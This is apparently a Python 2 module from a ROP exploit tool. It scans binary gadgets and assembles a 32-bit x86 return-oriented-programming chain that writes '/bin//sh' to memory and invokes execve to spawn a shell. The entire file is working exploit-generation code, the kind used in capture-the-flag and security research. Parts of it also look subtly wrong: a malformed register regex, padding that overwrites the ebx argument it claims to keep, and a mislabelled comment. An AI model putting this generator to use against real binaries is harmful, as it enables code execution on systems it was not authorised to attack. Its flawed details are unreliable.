from struct import pack
import re

class Ropchain:
    def __init__(self, gadgets, dataSectionOffset):
        self.__gadgets = gadgets
        self.__dataSectionOffset = dataSectionOffset
        self.__write_tested = []
        self.__chain = []

        self.__find_ropchain_gadgets()

    def __find_instruction(self, instruction):
        for gadget in self.__gadgets:
            usable = True
            match = re.search(instruction, gadget["insts"].split(" ; ")[0])
            if match:
                if (gadget["vaddr"] in self.__write_tested and
                    ('dst' in instruction or 'src' in instruction)):
                    continue
                instructions = gadget["insts"].split(" ; ")[1:]
                for inst in instructions:
                    if inst.split()[0] != "pop" and inst.split()[0] != "ret":
                        usable = False
                    if (inst != "ret" and inst.split()[0] == "ret" and
                        inst.split()[1] != ""):
                        usable = False
                if not usable:
                    continue
                dst = src = None
                if 'dst' in instruction and 'src' in instruction:
                    dst = match.group("dst")
                    src = match.group("src")
                return (gadget, dst, src)
        return (None, None, None)

    def __missing_gadgets(self, messages):
        for message in messages:
            print "Unable to find gadget '{0}'".format(message)

    def __found_gadgets(self, gadgets):
        for gadget in gadgets:
            print("Found gadget at 0x%x: %s") % (gadget["vaddr"],
                                                 gadget["insts"])
    def __find_ropchain_gadgets(self):
        write_regex = "mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$"
        missing_gadgets = []

        self.__gadgets.reverse()

        print 'Collecting gadgets for ropchain:'
        print '-Write to arbritary address'

        while True:
            (write, reg_a, reg_b) = self.__find_instruction(write_regex)
            if not write:
                self.__missing_gadgets(["mov dword ptr [r32], r32"])
                return

            self.__found_gadgets([write])

            popDst = self.__find_instruction("pop {0}".format(reg_a))[0]
            if not popDst:
                self.__missing_gadgets(["pop {0}".format(reg_a)])

            popSrc = self.__find_instruction("pop {0}".format(reg_b))[0]
            if not popSrc:
                self.__missing_gadgets(["pop {0}".format(reg_b)])

            xorSrc = self.__find_instruction("xor {0}, {0}".format(reg_b))[0]
            if not xorSrc:
                self.__missing_gadgets(["xor {0}, {0}".format(reg_b)])

            if not popDst or not popSrc or not xorSrc:
                self.__write_tested.append(write["vaddr"])
                continue
            else:
                self.__found_gadgets([popDst, popSrc, xorSrc])
                break

        # Init syscall number

        xorEax = self.__find_instruction("xor eax, eax")[0]
        if not xorEax:
            missing_gadgets.append("xor eax, eax")

        incEax = self.__find_instruction("inc eax")[0]
        if not incEax:
            missing_gadgets.append("inc eax")

        # Init syscall arguments

        popEbx = self.__find_instruction("pop ebx")[0]
        if not popEbx:
            missing_gadgets.append("pop ebx")

        popEcx = self.__find_instruction("pop ecx")[0]
        if not popEcx:
            missing_gadgets.append("pop ecx")

        popEdx = self.__find_instruction("pop edx")[0]
        if not popEdx:
            missing_gadgets.append("pop edx")

        # Syscall

        syscall = self.__find_instruction("int 0x80|sysenter|syscall|call DWORD PTR gs:0x10")[0]
        if not syscall:
            missing_gadgets.append("syscall")

        if (not xorEax or not incEax or not popEbx
           or not popEcx or not popEdx or not syscall):
            self.__missing_gadgets(missing_gadgets)
            return

        print "-Init syscall number"
        self.__found_gadgets([xorEax, incEax])

        print "-Init syscall arguments"
        self.__found_gadgets([popEbx, popEcx, popEdx])

        print "-Syscall"
        self.__found_gadgets([syscall])

        print '------------------------------------------------------'

        self.__generate_chain(write, popDst, popSrc, xorSrc, xorEax,
                              popEbx, popEcx, popEdx, incEax, syscall)

    def __pad_chain(self, gadget, regs_set):
        lg = gadget["insts"].split(" ; ")
        chain = ''
        for g in lg[1:]:
            if g.split()[0] == "pop":
                reg = g.split()[1]
                try:
                    chain += pack('<I', regs_set[reg])
                except KeyError:
                    chain += pack('<I', 0xdeadbeef)
        return chain

    def __generate_chain(self, write, popDst, popSrc, xorSrc,
                         xorEax, popEbx, popEcx, popEdx, incEax, syscall):
        data_address = self.__dataSectionOffset
        if data_address == None:
            print("Data section not found")
            return

        chain = ''

        # Write /bin//sh to data section
        chain += pack('<I', popDst["vaddr"])  # setup write destination
        chain += pack('<I', data_address)     # with address of data section
        chain += self.__pad_chain(popDst, {})

        chain += pack('<I', popSrc["vaddr"])  # setup write source
        chain += '/bin'                       # with first part of /bin/sh
        chain += self.__pad_chain(popSrc, {popDst["insts"].split()[1]: data_address})
                                              # keep write destination

        chain += pack('<I', write["vaddr"])   # do write
        chain += self.__pad_chain(write, {})

        chain += pack('<I', popDst["vaddr"])  # setup write destination
        chain += pack('<I', data_address + 4) # with address of data section
        chain += self.__pad_chain(popDst, {})

        chain += pack('<I', popSrc["vaddr"])  # setup write source
        chain += '//sh'                       # with second part of /bin/sh
        chain += self.__pad_chain(popSrc, {popDst["insts"].split()[1]: data_address + 4})
                                              # keep write destination

        chain += pack('<I', write["vaddr"])   # do write
        chain += self.__pad_chain(write, {})

        chain += pack('<I', popDst["vaddr"])  # setup write destination
        chain += pack('<I', data_address + 8) # with address of data section
        chain += self.__pad_chain(popDst, {})

        chain += pack('<I', xorSrc["vaddr"])  # setup write source
        chain += self.__pad_chain(xorSrc, {popDst["insts"].split()[1]: data_address + 8})
                                              # keep write destination

        chain += pack('<I', write["vaddr"])   # do write
        chain += self.__pad_chain(write, {})

        # Set first argument as /bin//sh
        chain += pack('<I', popEbx["vaddr"])
        chain += pack('<I', data_address)
        chain += self.__pad_chain(popEbx, {})

        # Set second argument as \x00
        chain += pack('<I', popEcx["vaddr"])
        chain += pack('<I', data_address + 8)
        chain += self.__pad_chain(popEcx, {"ebx": data_address + 8})
                                              # keep first argument

        # Set third argument as \x00
        chain += pack('<I', popEdx["vaddr"])
        chain += pack('<I', data_address + 8)
        chain += self.__pad_chain(popEdx, {"ebx": data_address + 8,
                                           "ecx": data_address + 8})
                                              # keep first and second arguments

        # Set first argument to 0xb (syscall entry for execve)
        chain += pack('<I', xorEax["vaddr"])  # init eax with \x00
        chain += pack('<I', data_address + 8)
        chain += self.__pad_chain(xorEax, {"ebx": data_address + 8,
                                           "ecx": data_address + 8})
                                              # keep first and second arguments

        for i in range(0xb):
            chain += pack('<I', incEax["vaddr"])
            chain += self.__pad_chain(incEax, {"ebx": data_address + 8,
                                               "ecx": data_address + 8})
                                              # keep first and second arguments

        # Make syscall
        chain += pack('<I', syscall["vaddr"])

        self.__chain = chain

    def prettyPrintChain(self):
        if not self.__chain:
            print 'Not enough gadgets found to generate chain.'
        else:
            print 'Generated chain:'
            print repr(self.__chain)

        print '------------------------------------------------------'